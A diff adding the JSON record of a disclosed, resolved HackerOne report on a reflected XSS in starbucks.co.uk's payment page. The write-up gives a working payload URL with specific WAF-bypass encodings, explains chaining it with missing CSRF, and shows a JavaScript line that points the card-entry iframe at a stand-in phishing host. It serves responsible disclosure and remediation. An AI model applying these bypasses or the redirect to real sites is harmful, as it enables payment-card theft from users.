@@ -1,0 +1,125 @@
+{
+  "id": 227486,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc0ODY=",
+  "url": "https://hackerone.com/reports/227486",
+  "title": "XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-05-10T13:28:32.386Z",
+  "submitted_at": "2017-05-10T13:28:32.386Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bayotop",
+    "url": "/bayotop",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/c5g0hr3clmh63r1zeqlen4qzztym/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-05-22T21:50:20.339Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-05-02T07:40:58.511Z",
+  "team_member_agreed_on_going_public_at": "2018-05-22T21:50:20.228Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\n**Steps to reproduce:**\n\n0. Run Firefox (these steps *require* Firefox).\n1. Log in on https://www.starbucks.co.uk/account/signin\n2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\n3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\n4. After the page finishes loading click the \"Checkout\" title.\n5. A confirmation prompt is shown showing the current domain.\n\n**Note** that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\n\n**Description:**\n\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected \nLooking at the source code you see the whole URL is reflected in a link tag. \n\n```html\n<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" />\n```\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: \n\n```html\n<link rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" />\n```\n\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:\n\n```javascript\n$(\"#checkout\").bind(\"click\", function(e) {\n    $(\"#checkoutButton\").trigger(\"click\")\n});\n```\n\nYou see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id=\"checkoutButton\" onclick=\"malicous_js\"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. \n\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\n\n```javascript\ndocument.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\n```\n\n**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.\n\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\n\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n\n1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains \"%22\".\n3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\n4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n5. **+this.ownerDocument.domain)** -> the WAF doesn't like \"document\".\n\n**Impact**\n\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\n\n**Recommendation**\n\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned. ",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-06-01T07:40:58.585Z",
+  "allow_singular_disclosure_after": -250501393.23286912,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "loaymorad",
+    "sp1d3rs",
+    "wh0ru",
+    "foobar7",
+    "bogdantc",
+    "europa",
+    "mvc",
+    "bl4de",
+    "spam404",
+    "savitar0x01",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 13017,
+    "asset_type": "URL",
+    "asset_identifier": "www.starbucks.co.uk",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
